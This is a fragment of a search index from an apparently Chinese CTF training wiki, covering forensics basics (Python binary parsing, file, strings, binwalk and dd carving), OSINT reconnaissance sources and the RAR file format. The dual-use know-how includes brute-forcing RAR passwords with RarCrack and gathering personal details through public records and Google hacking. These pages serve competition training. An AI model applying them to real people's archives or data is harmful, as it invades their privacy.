\\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00 ' >>> struct . unpack ( '<ccIIIIIIHH' , bmp ) ( 'B' , 'M' , 691256 , 0 , 54 , 40 , 640 , 360 , 1 , 24 ) bytearray \u5b57\u8282\u6570\u7ec4 \u00b6 \u5c06\u6587\u4ef6\u4ee5\u4e8c\u8fdb\u5236\u6570\u7ec4\u5f62\u5f0f\u8bfb\u53d6 data = bytearray ( open ( 'challenge.png' , 'rb' ) . read ()) \u5b57\u8282\u6570\u7ec4\u5c31\u662f\u53ef\u53d8\u7248\u672c\u7684\u5b57\u8282 data [ 0 ] = ' \\x89 ' \u5e38\u7528\u5de5\u5177 \u00b6 010 Editor \u00b6 SweetScape 010 Editor \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u5341\u516d\u8fdb\u4f4d\u6587\u4ef6\u7f16\u8f91\u5668\uff0c\u5b83\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5341\u516d\u8fdb\u4f4d\u7f16\u8f91\u5668\u5728\u4e8e\u5b83\u53ef\u7528\u300c\u8303\u672c\u300d\u6765\u89e3\u6790\u4e8c\u8fdb\u4f4d\u6587\u4ef6\uff0c\u4ece\u800c\u8ba9\u4f60\u8bfb\u61c2\u548c\u7f16\u8f91\u5b83\u3002\u5b83\u8fd8\u53ef\u7528\u6765\u6bd4\u8f83\u4e00\u5207\u53ef\u89c6\u7684\u4e8c\u8fdb\u4f4d\u6587\u4ef6\u3002 \u5229\u7528\u5b83\u7684\u6a21\u677f\u529f\u80fd\u53ef\u4ee5\u975e\u5e38\u8f7b\u677e\u7684\u89c2\u5bdf\u6587\u4ef6\u5185\u90e8\u7684\u5177\u4f53\u7ed3\u6784\u5e76\u4e14\u4f9d\u6b64\u5feb\u901f\u66f4\u6539\u5185\u5bb9\u3002 file \u547d\u4ee4 \u00b6 file \u547d\u4ee4\u6839\u636e\u6587\u4ef6\u5934\uff08\u9b54\u6cd5\u5b57\u8282\uff09\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7c7b\u578b\u3002 root in ~/Desktop/tmp \u03bb file flag flag: PNG image data, 450 x 450 , 8 -bit grayscale, non-interlaced strings \u547d\u4ee4 \u00b6 \u6253\u5370\u6587\u4ef6\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\uff0c\u7ecf\u5e38\u7528\u6765\u53d1\u73b0\u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f\u6216\u662f\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\u4fe1\u606f\uff0c\u5e38\u5e38\u7528\u6765\u53d1\u73b0\u9898\u76ee\u7684\u7a81\u7834\u53e3\u3002 \u53ef\u4ee5\u914d\u5408 grep \u547d\u4ee4\u63a2\u6d4b\u6307\u5b9a\u4fe1\u606f strings test | grep -i XXCTF \u4e5f\u53ef\u4ee5\u914d\u5408 -o \u53c2\u6570\u83b7\u53d6\u6240\u6709 ASCII \u5b57\u7b26\u504f\u79fb root in ~/Desktop/tmp \u03bb strings -o flag | head 14 IHDR 45 gAMA 64 cHRM 141 bKGD 157 tIME 202 IDATx 223 NFdVK3 361 |; *- 410 Ge%<W 431 5duX@% binwalk \u547d\u4ee4 \u00b6 binwalk \u672c\u662f\u4e00\u4e2a\u56fa\u4ef6\u7684\u5206\u6790\u5de5\u5177\uff0c\u6bd4\u8d5b\u4e2d\u5e38\u7528\u6765\u53d1\u73b0\u591a\u4e2a\u6587\u4ef6\u7c98\u5408\u518d\u5728\u4e00\u8d77\u7684\u60c5\u51b5\u3002\u6839\u636e\u6587\u4ef6\u5934\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5939\u6742\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6709\u65f6\u4e5f\u4f1a\u5b58\u5728\u8bef\u62a5\u7387\uff08\u5c24\u5176\u662f\u5bf9Pcap\u6d41\u91cf\u5305\u7b49\u6587\u4ef6\u65f6\uff09\u3002 root in ~/Desktop/tmp \u03bb binwalk flag DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 450 x 450 , 8 -bit grayscale, non-interlaced 134 0x86 Zlib compressed data, best compression 25683 0x6453 Zip archive data, at least v2.0 to extract, compressed size: 675 , uncompressed size: 1159 , name: readme.txt 26398 0x671E Zip archive data, at least v2.0 to extract, compressed size: 430849 , uncompressed size: 1027984 , name: trid 457387 0x6FAAB End of Zip archive \u914d\u5408 -e \u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u81ea\u52a8\u5316\u63d0\u53d6\u3002 \u4e5f\u53ef\u4ee5\u7ed3\u5408 dd \u547d\u4ee4\u8fdb\u884c\u624b\u52a8\u5207\u5272\u3002 root in ~/Desktop/tmp \u03bb dd if = flag of = 1 .zip bs = 1 skip = 25683 431726 +0 records in 431726 +0 records out 431726 bytes ( 432 kB, 422 KiB ) copied, 0 .900973 s, 479 kB/s","title":"\u53d6\u8bc1\u9690\u5199\u524d\u7f6e\u6280\u672f"},{"location":"misc/prefix/#_1","text":"\u4e86\u89e3\u5e38\u89c1\u7684\u7f16\u7801 \u80fd\u591f\u5bf9\u6587\u4ef6\u4e2d\u51fa\u73b0\u7684\u4e00\u4e9b\u7f16\u7801\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u4e14\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\uff08Base64\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7b49\uff09\u6709\u4e00\u5b9a\u7684\u654f\u611f\u5ea6\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\u5e76\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002 \u80fd\u591f\u5229\u7528\u811a\u672c\u8bed\u8a00\uff08Python \u7b49\uff09\u53bb\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e \u719f\u77e5\u5e38\u89c1\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5c24\u5176\u662f\u5404\u7c7b \u6587\u4ef6\u5934 \u3001\u534f\u8bae\u3001\u7ed3\u6784\u7b49 \u7075\u6d3b\u8fd0\u7528\u5e38\u89c1\u7684\u5de5\u5177","title":"\u524d\u7f6e\u6280\u80fd"},{"location":"misc/prefix/#python","text":"","title":"Python \u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e"},{"location":"misc/prefix/#struct","text":"\u6709\u7684\u65f6\u5019\u9700\u8981\u7528 Python \u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\uff0c\u5b58\u53d6\u6587\u4ef6\uff0csocket \u64cd\u4f5c\u65f6\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u7528 Python \u7684 struct \u6a21\u5757\u6765\u5b8c\u6210\u3002 struct \u6a21\u5757\u4e2d\u6700\u91cd\u8981\u7684\u4e09\u4e2a\u51fd\u6570\u662f pack() \u3001 unpack() \u548c calcsize() pack(fmt, v1, v2, ...) \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\uff0c\u628a\u6570\u636e\u5c01\u88c5\u6210\u5b57\u7b26\u4e32\uff08\u5b9e\u9645\u4e0a\u662f\u7c7b\u4f3c\u4e8ec\u7ed3\u6784\u4f53\u7684\u5b57\u8282\u6d41\uff09 unpack(fmt, string) \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u89e3\u6790\u5b57\u8282\u6d41 string\uff0c\u8fd4\u56de\u89e3\u6790\u51fa\u6765\u7684 tuple calcsize(fmt) \u8ba1\u7b97\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u5360\u7528\u591a\u5c11\u5b57\u8282\u7684\u5185\u5b58 \u8fd9\u91cc\u6253\u5305\u683c\u5f0f fmt \u786e\u5b9a\u4e86\u5c06\u53d8\u91cf\u6309\u7167\u4ec0\u4e48\u65b9\u5f0f\u6253\u5305\u6210\u5b57\u8282\u6d41\uff0c\u5176\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u7ed9\u51fa\u4e0d\u540c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u542b\u4e49\u4e86\uff0c\u8be6\u7ec6\u7ec6\u8282\u53ef\u4ee5\u53c2\u7167 Python Doc >>> import struct >>> struct . pack ( '>I' , 16 ) ' \\x00\\x00\\x00\\x10 ' pack \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c '>I' \u7684\u610f\u601d\u662f\uff1a > \u8868\u793a\u5b57\u8282\u987a\u5e8f\u662f Big-Endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0c I \u8868\u793a 4 \u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u540e\u9762\u7684\u53c2\u6570\u4e2a\u6570\u8981\u548c\u5904\u7406\u6307\u4ee4\u4e00\u81f4\u3002 \u8bfb\u5165\u4e00\u4e2a BMP \u6587\u4ef6\u7684\u524d 30 \u5b57\u8282\uff0c\u6587\u4ef6\u5934\u7684\u7ed3\u6784\u6309\u987a\u5e8f\u5982\u4e0b \u4e24\u4e2a\u5b57\u8282\uff1a BM \u8868\u793a Windows \u4f4d\u56fe\uff0c BA \u8868\u793a OS/2 \u4f4d\u56fe \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u8868\u793a\u4f4d\u56fe\u5927\u5c0f \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u4fdd\u7559\u4f4d\uff0c\u59cb\u7ec8\u4e3a 0 \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u5b9e\u9645\u56fe\u50cf\u7684\u504f\u79fb\u91cf \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1aHeader \u7684\u5b57\u8282\u6570 \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u5bbd\u5ea6 \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u9ad8\u5ea6 \u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u59cb\u7ec8\u4e3a 1 \u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u989c\u8272\u6570 >>> import struct >>> bmp = ' \\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00 ' >>> struct . unpack ( '<ccIIIIIIHH' , bmp ) ( 'B' , 'M' , 691256 , 0 , 54 , 40 , 640 , 360 , 1 , 24 )","title":"struct \u6a21\u5757"},{"location":"misc/prefix/#bytearray","text":"\u5c06\u6587\u4ef6\u4ee5\u4e8c\u8fdb\u5236\u6570\u7ec4\u5f62\u5f0f\u8bfb\u53d6 data = bytearray ( open ( 'challenge.png' , 'rb' ) . read ()) \u5b57\u8282\u6570\u7ec4\u5c31\u662f\u53ef\u53d8\u7248\u672c\u7684\u5b57\u8282 data [ 0 ] = ' \\x89 '","title":"bytearray \u5b57\u8282\u6570\u7ec4"},{"location":"misc/prefix/#_2","text":"","title":"\u5e38\u7528\u5de5\u5177"},{"location":"misc/prefix/#010-editor","text":"SweetScape 010 Editor \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u5341\u516d\u8fdb\u4f4d\u6587\u4ef6\u7f16\u8f91\u5668\uff0c\u5b83\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5341\u516d\u8fdb\u4f4d\u7f16\u8f91\u5668\u5728\u4e8e\u5b83\u53ef\u7528\u300c\u8303\u672c\u300d\u6765\u89e3\u6790\u4e8c\u8fdb\u4f4d\u6587\u4ef6\uff0c\u4ece\u800c\u8ba9\u4f60\u8bfb\u61c2\u548c\u7f16\u8f91\u5b83\u3002\u5b83\u8fd8\u53ef\u7528\u6765\u6bd4\u8f83\u4e00\u5207\u53ef\u89c6\u7684\u4e8c\u8fdb\u4f4d\u6587\u4ef6\u3002 \u5229\u7528\u5b83\u7684\u6a21\u677f\u529f\u80fd\u53ef\u4ee5\u975e\u5e38\u8f7b\u677e\u7684\u89c2\u5bdf\u6587\u4ef6\u5185\u90e8\u7684\u5177\u4f53\u7ed3\u6784\u5e76\u4e14\u4f9d\u6b64\u5feb\u901f\u66f4\u6539\u5185\u5bb9\u3002","title":"010 Editor"},{"location":"misc/prefix/#file","text":"file \u547d\u4ee4\u6839\u636e\u6587\u4ef6\u5934\uff08\u9b54\u6cd5\u5b57\u8282\uff09\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7c7b\u578b\u3002 root in ~/Desktop/tmp \u03bb file flag flag: PNG image data, 450 x 450 , 8 -bit grayscale, non-interlaced","title":"file \u547d\u4ee4"},{"location":"misc/prefix/#strings","text":"\u6253\u5370\u6587\u4ef6\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\uff0c\u7ecf\u5e38\u7528\u6765\u53d1\u73b0\u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f\u6216\u662f\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\u4fe1\u606f\uff0c\u5e38\u5e38\u7528\u6765\u53d1\u73b0\u9898\u76ee\u7684\u7a81\u7834\u53e3\u3002 \u53ef\u4ee5\u914d\u5408 grep \u547d\u4ee4\u63a2\u6d4b\u6307\u5b9a\u4fe1\u606f strings test | grep -i XXCTF \u4e5f\u53ef\u4ee5\u914d\u5408 -o \u53c2\u6570\u83b7\u53d6\u6240\u6709 ASCII \u5b57\u7b26\u504f\u79fb root in ~/Desktop/tmp \u03bb strings -o flag | head 14 IHDR 45 gAMA 64 cHRM 141 bKGD 157 tIME 202 IDATx 223 NFdVK3 361 |; *- 410 Ge%<W 431 5duX@%","title":"strings \u547d\u4ee4"},{"location":"misc/prefix/#binwalk","text":"binwalk \u672c\u662f\u4e00\u4e2a\u56fa\u4ef6\u7684\u5206\u6790\u5de5\u5177\uff0c\u6bd4\u8d5b\u4e2d\u5e38\u7528\u6765\u53d1\u73b0\u591a\u4e2a\u6587\u4ef6\u7c98\u5408\u518d\u5728\u4e00\u8d77\u7684\u60c5\u51b5\u3002\u6839\u636e\u6587\u4ef6\u5934\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5939\u6742\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6709\u65f6\u4e5f\u4f1a\u5b58\u5728\u8bef\u62a5\u7387\uff08\u5c24\u5176\u662f\u5bf9Pcap\u6d41\u91cf\u5305\u7b49\u6587\u4ef6\u65f6\uff09\u3002 root in ~/Desktop/tmp \u03bb binwalk flag DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 450 x 450 , 8 -bit grayscale, non-interlaced 134 0x86 Zlib compressed data, best compression 25683 0x6453 Zip archive data, at least v2.0 to extract, compressed size: 675 , uncompressed size: 1159 , name: readme.txt 26398 0x671E Zip archive data, at least v2.0 to extract, compressed size: 430849 , uncompressed size: 1027984 , name: trid 457387 0x6FAAB End of Zip archive \u914d\u5408 -e \u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u81ea\u52a8\u5316\u63d0\u53d6\u3002 \u4e5f\u53ef\u4ee5\u7ed3\u5408 dd \u547d\u4ee4\u8fdb\u884c\u624b\u52a8\u5207\u5272\u3002 root in ~/Desktop/tmp \u03bb dd if = flag of = 1 .zip bs = 1 skip = 25683 431726 +0 records in 431726 +0 records out 431726 bytes ( 432 kB, 422 KiB ) copied, 0 .900973 s, 479 kB/s","title":"binwalk \u547d\u4ee4"},{"location":"misc/recon/","text":"\u7f51\u7edc\u4fe1\u606f\u641c\u96c6\u6280\u5de7 \u00b6 \u516c\u5f00\u6e20\u9053 \u76ee\u6807 Web \u7f51\u9875\u3001\u5730\u7406\u4f4d\u7f6e\u3001\u76f8\u5173\u7ec4\u7ec7 \u7ec4\u7ec7\u7ed3\u6784\u548c\u4eba\u5458\u3001\u4e2a\u4eba\u8d44\u6599\u3001\u7535\u8bdd\u3001\u7535\u5b50\u90ae\u4ef6 \u7f51\u7edc\u914d\u7f6e\u3001\u5b89\u5168\u9632\u62a4\u673a\u5236\u7684\u7b56\u7565\u548c\u6280\u672f\u7ec6\u8282 \u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u67e5\u627e\u7279\u5b9a\u5b89\u5168\u6f0f\u6d1e\u6216\u79c1\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5 Google Hacking Database \u79d1\u5b66\u4e0a\u7f51 \u57fa\u672c\u641c\u7d22\u6280\u5de7 \u00b6 Google \u57fa\u672c\u641c\u7d22\u4e0e\u6316\u6398\u6280\u5de7 \u4fdd\u6301\u7b80\u5355\u660e\u4e86\u7684\u5173\u952e\u8bcd \u4f7f\u7528\u6700\u53ef\u80fd\u51fa\u73b0\u5728\u8981\u67e5\u627e\u7684\u7f51\u9875\u4e0a\u7684\u5b57\u8bcd \u5c3d\u91cf\u7b80\u660e\u627c\u8981\u5730\u63cf\u8ff0\u8981\u67e5\u627e\u7684\u5185\u5bb9 \u9009\u62e9\u72ec\u7279\u6027\u7684\u63cf\u8ff0\u5b57\u8bcd \u793e\u4f1a\u516c\u5171\u4fe1\u606f\u5e93\u67e5\u8be2 \u4e2a\u4eba\u4fe1\u606f\uff1a\u4eba\u53e3\u7edf\u8ba1\u5c40 \u4f01\u4e1a\u7b49\u5b9e\u4f53\uff1aYellowPage\u3001\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7f51 \u7f51\u7ad9\u3001\u57df\u540d\u3001IP\uff1awhois \u7b49 \u5730\u56fe\u548c\u8857\u666f\u641c\u7d22 \u00b6 \u56fd\u5916\uff1aGoogle Map\u3001Google Earth\u3001Google Street View \u56fd\u5185\uff1a\u767e\u5ea6\u5730\u56fe\u3001\u536b\u661f\u5730\u56fe\u3001\u8857\u666f \u4ece\u7f51\u7edc\u4e16\u754c\u5230\u7269\u7406\u4e16\u754c\uff1aIP2Location whois \u6570\u636e\u5e93 GeoIP IP2Location \u7eaf\u771f\u6570\u636e\u5e93\uff08QQ IP \u67e5\u8be2\uff09","title":"\u4fe1\u606f\u641c\u96c6\u6280\u672f"},{"location":"misc/recon/#_1","text":"\u516c\u5f00\u6e20\u9053 \u76ee\u6807 Web \u7f51\u9875\u3001\u5730\u7406\u4f4d\u7f6e\u3001\u76f8\u5173\u7ec4\u7ec7 \u7ec4\u7ec7\u7ed3\u6784\u548c\u4eba\u5458\u3001\u4e2a\u4eba\u8d44\u6599\u3001\u7535\u8bdd\u3001\u7535\u5b50\u90ae\u4ef6 \u7f51\u7edc\u914d\u7f6e\u3001\u5b89\u5168\u9632\u62a4\u673a\u5236\u7684\u7b56\u7565\u548c\u6280\u672f\u7ec6\u8282 \u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u67e5\u627e\u7279\u5b9a\u5b89\u5168\u6f0f\u6d1e\u6216\u79c1\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5 Google Hacking Database \u79d1\u5b66\u4e0a\u7f51","title":"\u7f51\u7edc\u4fe1\u606f\u641c\u96c6\u6280\u5de7"},{"location":"misc/recon/#_2","text":"Google \u57fa\u672c\u641c\u7d22\u4e0e\u6316\u6398\u6280\u5de7 \u4fdd\u6301\u7b80\u5355\u660e\u4e86\u7684\u5173\u952e\u8bcd \u4f7f\u7528\u6700\u53ef\u80fd\u51fa\u73b0\u5728\u8981\u67e5\u627e\u7684\u7f51\u9875\u4e0a\u7684\u5b57\u8bcd \u5c3d\u91cf\u7b80\u660e\u627c\u8981\u5730\u63cf\u8ff0\u8981\u67e5\u627e\u7684\u5185\u5bb9 \u9009\u62e9\u72ec\u7279\u6027\u7684\u63cf\u8ff0\u5b57\u8bcd \u793e\u4f1a\u516c\u5171\u4fe1\u606f\u5e93\u67e5\u8be2 \u4e2a\u4eba\u4fe1\u606f\uff1a\u4eba\u53e3\u7edf\u8ba1\u5c40 \u4f01\u4e1a\u7b49\u5b9e\u4f53\uff1aYellowPage\u3001\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7f51 \u7f51\u7ad9\u3001\u57df\u540d\u3001IP\uff1awhois \u7b49","title":"\u57fa\u672c\u641c\u7d22\u6280\u5de7"},{"location":"misc/recon/#_3","text":"\u56fd\u5916\uff1aGoogle Map\u3001Google Earth\u3001Google Street View \u56fd\u5185\uff1a\u767e\u5ea6\u5730\u56fe\u3001\u536b\u661f\u5730\u56fe\u3001\u8857\u666f \u4ece\u7f51\u7edc\u4e16\u754c\u5230\u7269\u7406\u4e16\u754c\uff1aIP2Location whois \u6570\u636e\u5e93 GeoIP IP2Location \u7eaf\u771f\u6570\u636e\u5e93\uff08QQ IP \u67e5\u8be2\uff09","title":"\u5730\u56fe\u548c\u8857\u666f\u641c\u7d22"},{"location":"misc/archive/rar/","text":"\u6587\u4ef6\u683c\u5f0f \u00b6 RAR \u6587\u4ef6\u4e3b\u8981\u7531\u6807\u8bb0\u5757\uff0c\u538b\u7f29\u6587\u4ef6\u5934\u5757\uff0c\u6587\u4ef6\u5934\u5757\uff0c\u7ed3\u5c3e\u5757\u7ec4\u6210\u3002 \u5176\u6bcf\u4e00\u5757\u5927\u81f4\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u6bb5\uff1a \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 \u5168\u90e8\u5757\u6216\u5757\u90e8\u5206\u7684CRC HEAD_TYPE 1 \u5757\u7c7b\u578b HEAD_FLAGS 2 \u963b\u6b62\u6807\u5fd7 HEAD_SIZE 2 \u5757\u5927\u5c0f ADD_SIZE 4 \u53ef\u9009\u5b57\u6bb5 - \u6dfb\u52a0\u5757\u5927\u5c0f Rar\u538b\u7f29\u5305\u7684\u6587\u4ef6\u5934\u4e3a 0x 52 61 72 21 1A 07 00 \u3002 \u7d27\u8ddf\u7740\u6587\u4ef6\u5934\uff080x526172211A0700\uff09\u7684\u662f\u6807\u8bb0\u5757\uff08MARK_HEAD\uff09\uff0c\u5176\u540e\u8fd8\u6709\u6587\u4ef6\u5934\uff08File Header\uff09\u3002 \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 CRC of fields from HEAD_TYPE to FILEATTR and file name HEAD_TYPE 1 Header Type: 0x74 HEAD_FLAGS 2 Bit Flags (Please see \u2018Bit Flags for File in Archive\u2019 table for all possibilities)\uff08\u4f2a\u52a0\u5bc6\uff09 HEAD_SIZE 2 File header full size including file name and comments PACK_SIZE 4 Compressed file size UNP_SIZE 4 Uncompressed file size HOST_OS 1 Operating system used for archiving (See the \u2018Operating System Indicators\u2019 table for the flags used) FILE_CRC 4 File CRC FTIME 4 Date and time in standard MS DOS format UNP_VER 1 RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.) METHOD 1 Packing method (Please see \u2018Packing Method\u2019 table for all possibilities NAME_SIZE 2 File name size ATTR 4 File attributes HIGH_PACK_SIZ 4 High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. HIGH_UNP_SIZE 4 High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. FILE_NAME NAME_SIZE bytes File name - string of NAME_SIZE bytes size SALT 8 present if (HEAD_FLAGS & 0x400) != 0 EXT_TIME variable size present if (HEAD_FLAGS & 0x1000) != 0 \u6bcf\u4e2a RAR \u6587\u4ef6\u7684\u7ed3\u5c3e\u5feb\uff08Terminator\uff09\u90fd\u662f\u56fa\u5b9a\u7684\u3002 Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 \u66f4\u591a\u8be6\u89c1 http://www.forensicswiki.org/wiki/RAR \u4e3b\u8981\u653b\u51fb \u00b6 \u7206\u7834 \u00b6 Linux\u4e0b\u7684 RarCrack \u4f2a\u52a0\u5bc6 \u00b6 RAR \u6587\u4ef6\u7684\u4f2a\u52a0\u5bc6\u5728\u6587\u4ef6\u5934\u4e2d\u7684\u4f4d\u6807\u8bb0\u5b57\u6bb5\u4e0a\uff0c\u7528 010 Editor \u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u89c1\u8fd9\u4e00\u4f4d\uff0c\u4fee\u6539\u8fd9\u4e00\u4f4d\u53ef\u4ee5\u9020\u6210\u4f2a\u52a0\u5bc6\u3002 \u5176\u4f59\u660e\u6587\u653b\u51fb\u7b49\u624b\u6cd5\u4f9d\u65e7\u540c ZIP \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\u3002","title":"RAR \u683c\u5f0f"},{"location":"misc/archive/rar/#_1","text":"RAR \u6587\u4ef6\u4e3b\u8981\u7531\u6807\u8bb0\u5757\uff0c\u538b\u7f29\u6587\u4ef6\u5934\u5757\uff0c\u6587\u4ef6\u5934\u5757\uff0c\u7ed3\u5c3e\u5757\u7ec4\u6210\u3002 \u5176\u6bcf\u4e00\u5757\u5927\u81f4\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u6bb5\uff1a \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 \u5168\u90e8\u5757\u6216\u5757\u90e8\u5206\u7684CRC HEAD_TYPE 1 \u5757\u7c7b\u578b HEAD_FLAGS 2 \u963b\u6b62\u6807\u5fd7 HEAD_SIZE 2 \u5757\u5927\u5c0f ADD_SIZE 4 \u53ef\u9009\u5b57\u6bb5 - \u6dfb\u52a0\u5757\u5927\u5c0f Rar\u538b\u7f29\u5305\u7684\u6587\u4ef6\u5934\u4e3a 0x 52 61 72 21 1A 07 00 \u3002 \u7d27\u8ddf\u7740\u6587\u4ef6\u5934\uff080x526172211A0700\uff09\u7684\u662f\u6807\u8bb0\u5757\uff08MARK_HEAD\uff09\uff0c\u5176\u540e\u8fd8\u6709\u6587\u4ef6\u5934\uff08File Header\uff09\u3002 \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 CRC of fields from HEAD_TYPE to FILEATTR and file name HEAD_TYPE 1 Header Type: 0x74 HEAD_FLAGS 2 Bit Flags (Please see \u2018Bit Flags for File in Archive\u2019 table for all possibilities)\uff08\u4f2a\u52a0\u5bc6\uff09 HEAD_SIZE 2 File header full size including file name and comments PACK_SIZE 4 Compressed file size UNP_SIZE 4 Uncompressed file size HOST_OS 1 Operating system used for archiving (See the \u2018Operating System Indicators\u2019 table for the flags used) FILE_CRC 4 File CRC FTIME 4 Date and time in standard MS DOS format UNP_VER 1 RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.) METHOD 1 Packing method (Please see \u2018Packing Method\u2019 table for all possibilities NAME_SIZE 2 File name size ATTR 4 File attributes HIGH_PACK_SIZ 4 High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. HIGH_UNP_SIZE 4 High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. FILE_NAME NAME_SIZE bytes File name - string of NAME_SIZE bytes size SALT 8 present if (HEAD_FLAGS & 0x400) != 0 EXT_TIME variable size present if (HEAD_FLAGS & 0x1000) != 0 \u6bcf\u4e2a RAR \u6587\u4ef6\u7684\u7ed3\u5c3e\u5feb\uff08Terminator\uff09\u90fd\u662f\u56fa\u5b9a\u7684\u3002 Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 \u66f4\u591a\u8be6\u89c1 http://www.forensicswiki.org/wiki/RAR","title":"\u6587\u4ef6\u683c\u5f0f"},{"location":"misc/archive/rar/#_2","text":"","title":"\u4e3b\u8981\u653b\u51fb"},{"location":"misc/archive/rar/#_3","text":"Linux\u4e0b\u7684 RarCrack","title":"\u7206\u7834"},{"location":"misc/archive/rar/#_4","text":"RAR \u6587\u4ef6\u7684\u4f2a\u52a0\u5bc6\u5728\u6587\u4ef6\u5934\u4e2d\u7684\u4f4d\u6807\u8bb0\u5b57\u6bb5\u4e0a\uff0c\u7528 010 Editor \u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u89c1\u8fd9\u4e00\u4f4d\uff0c\u4fee\u6539\u8fd9\u4e00\u4f4d\u53ef\u4ee5\u9020\u6210\u4f2a\u52a0\u5bc6\u3002 \u5176\u4f59\u660e\u6587\u653b\u51fb\u7b49\u624b\u6cd5\u4f9d\u65e7\u540c ZIP \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\u3002","title":"\u4f2a\u52a0\u5bc6"},{"location":"misc/archive/zip/","text":"\u6587\u4ef6\u7ed3\u6784 \u00b6 ZIP \u6587\u4ef6\u4e3b\u8981\u7531\u4e09\u90e8\u5206\u6784\u6210\uff0c\u5206\u522b\u4e3a \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a 